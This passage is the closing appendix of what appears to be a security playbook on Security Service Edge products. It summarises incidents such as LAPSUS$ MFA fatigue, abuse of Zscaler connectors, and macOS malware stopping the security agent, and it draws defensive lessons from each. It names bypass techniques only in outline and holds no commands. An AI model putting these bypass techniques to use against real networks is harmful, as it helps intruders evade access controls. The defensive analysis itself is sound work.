
- **Reference**: CISA AA22-040A
- **Summary**: LAPSUS$ used MFA fatigue (push-bombing) and stolen session tokens to compromise Okta, Microsoft, Samsung, NVIDIA, Uber.
- **SSE Implication**: Stolen session tokens grant access through the SSE that trusts the compromised IdP. MFA fatigue bypasses the user's MFA but not the token's existence.
- **Lesson**: Phishing-resistant MFA (FIDO2) for admins; number-matching for users.

### A.4 Mandiant 2024 Zscaler App Connector Research

- **Reference**: Mandiant blog (2024)
- **Summary**: Chinese APT targeted Zscaler ZPA App Connectors as a persistence mechanism after the initial email compromise.
- **SSE Implication**: App Connectors hold long-lived mTLS certs + provisioning keys. Compromise one → reach every internal app it publishes.
- **Lesson**: Restrict provisioning key scope; require admin approval for new connector deployment; monitor connector list for unexpected entries.

### A.5 Mandiant BYOD Malware Research (2023)

- **Reference**: Mandiant blog (2023)
- **Summary**: An OSX/Shlayer variant specifically tried to disable Zscaler Client Connector on macOS BYOD devices.
- **SSE Implication**: BYOD devices are outside MDM enforcement; malware can stop the agent.
- **Lesson**: BYOD posture policy should be stricter than managed-device policy; BYOD should not reach privileged internal apps.

### A.6 CrowdStrike 2023 SSE Bypass Research

- **Reference**: CrowdStrike blog (2023)
- **Summary**: Generic patterns for SSE bypass: agent stop, race condition, anonymizer evasion.
- **SSE Implication**: The bypass patterns are cross-vendor; defenders must monitor for the techniques, not the vendor-specific signature.
- **Lesson**: EDR detection rules for agent service stop, anomalous DNS egress, root cert tampering.

---

**End of playbook.** For command catalogue, see `../payloads.md`. For structured test cases, see `../test-cases.md`. For skill definition, see `../SKILL.md`.
